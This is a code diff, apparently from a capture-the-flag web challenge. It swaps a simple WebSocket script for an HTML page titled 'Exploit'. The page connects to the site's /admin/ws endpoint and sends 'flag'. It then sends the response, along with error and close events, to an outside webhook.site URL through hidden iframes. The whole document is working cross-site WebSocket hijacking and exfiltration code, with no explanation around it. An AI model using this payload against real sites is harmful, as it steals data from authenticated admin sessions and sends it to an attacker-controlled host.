@@ -1,20 +1,50 @@
-
-const ws = new WebSocket(`ws://127.0.0.1:8080/admin/ws`);
-
-// Set up event handlers
-ws.onopen = function() {
-  console.log("Connection established");
-  // Send the command to get the flag
-  ws.send("flag");
-};
-
-ws.onmessage = function(event) {
-  console.log("Received:", event.data);
-  // Exfiltrate the flag
-  fetch('http://webhook.site/7dc602c0-3b28-4688-b3ec-2ff5d970ac9c?flag=' + encodeURIComponent(event.data));
-};
-
-ws.onerror = function(error) {
-  console.error("WebSocket error:", error);
-};
-
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit</title>
+</head>
+<body>
+    <script>
+        // Wait a bit to ensure the page is fully loaded
+        setTimeout(() => {
+            // Create WebSocket connection
+            const ws = new WebSocket(`ws://${window.top.location.host}/admin/ws`);
+            
+            ws.onopen = function() {
+                console.log("WebSocket connection opened");
+                // Send the flag command
+                ws.send("flag");
+            };
+            
+            ws.onmessage = function(event) {
+                console.log("Received:", event.data);
+                
+                // Exfiltrate using iframe navigation
+                const hiddenFrame = document.createElement('iframe');
+                hiddenFrame.style.display = 'none';
+                document.body.appendChild(hiddenFrame);
+                hiddenFrame.src = 'http://webhook.site/7dc602c0-3b28-4688-b3ec-2ff5d970ac9c?flag=' + encodeURIComponent(event.data);
+            };
+            
+            ws.onerror = function(error) {
+                console.error("WebSocket error:", error);
+                // Try to exfiltrate the error info
+                const errorFrame = document.createElement('iframe');
+                errorFrame.style.display = 'none';
+                document.body.appendChild(errorFrame);
+                errorFrame.src = 'http://webhook.site/7dc602c0-3b28-4688-b3ec-2ff5d970ac9c?error=ws_error';
+            };
+            
+            // Close handler
+            ws.onclose = function() {
+                console.log("WebSocket closed");
+                // Try to record this event
+                const closedFrame = document.createElement('iframe');
+                closedFrame.style.display = 'none';
+                document.body.appendChild(closedFrame);
+                closedFrame.src = 'http://webhook.site/7dc602c0-3b28-4688-b3ec-2ff5d970ac9c?event=ws_closed';
+            };
+        }, 1000);  // 1 second delay
+    </script>
+</body>
+</html>
